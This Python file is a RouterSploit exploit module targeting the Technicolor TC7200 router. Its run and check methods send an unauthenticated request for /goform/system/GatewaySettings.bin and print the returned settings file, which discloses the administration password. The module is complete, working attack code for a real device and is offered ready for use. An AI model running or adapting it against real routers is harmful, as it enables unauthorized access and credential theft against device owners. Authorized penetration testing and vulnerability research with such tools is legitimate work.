from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Technicolor TC7200 Password Disclosure",
        "description": "Module exploits Technicolor TC7200 password disclosure vulnerability "
                       "which allows fetching administration's password.",
        "authors": (
            "Jeroen - IT Nerdbox",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/31894/",
        ),
        "devices": (
            "Technicolor TC7200",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/goform/system/GatewaySettings.bin",
        )
        if response is None:
            return

        if response.status_code == 200 and "0MLog" in response.text:
            print_success("Exploit success")
            print_status("Reading GatewaySettings.bin...")
            print_info(response.text)
        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/goform/system/GatewaySettings.bin"
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "0MLog" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
